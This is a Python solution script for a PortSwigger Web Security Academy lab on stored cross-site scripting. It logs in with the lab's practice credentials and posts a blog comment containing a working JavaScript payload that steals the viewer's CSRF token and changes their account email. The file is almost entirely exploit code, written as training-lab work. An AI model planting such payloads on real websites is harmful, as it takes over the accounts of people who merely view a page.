'''
This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: wiener:peter

Lab link: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
'''

import requests
from bs4 import BeautifulSoup


lab_id = '0ae20081032d2ecb84495ae70045006e' #change based on generated lab

# Payload goes into the comment section and is a full fledged JS function that will use fetch to 
# perform the user actions via csrf (assuming user is already logged in).
payload = ''' 
<script>
async function changeEmail() {
    let response = await fetch("/my-account");
    let data = await response.text();
    let csrf = data.match(/name="csrf" value="(\w+)"/)[1];

    fetch("/my-account/change-email", {
        body: new URLSearchParams({
            "email": 'hacker@hacked.com',
            "csrf" : csrf
        }),
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        method: "post"
    })
}

changeEmail()
</script>
''' 

def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']


def main():
    s = requests.session()
    # first login as weiner:peter as instructed
    uri = f"https://{lab_id}.web-security-academy.net/login"
    r1 = s.get(uri) 
    token = token_extract(r1.text) # login csrf token
    
    # data for the post request to login
    data = { 'username' : "wiener",
            'password' : "peter",
            'csrf': token
    }
    r2 = s.post(uri, data=data)

    # Go to a post to get the comment csrf token
    uri = f"https://{lab_id}.web-security-academy.net/post?postId=1" 
    r3 = s.get(uri)
    token = token_extract(r3.text) # comment csrf token

    # Inject payload into post comment
    uri = f"https://{lab_id}.web-security-academy.net/post/comment" 
    data = {"csrf": token, "postId" : 1, "comment": payload, "name": "hacker", "email": "hacker@hacked.com", "website": ""}
    r4 = s.post(uri, data=data)    

    # When the post page is loaded, csrf will trigger
    print('done')


if __name__ == '__main__':
    main()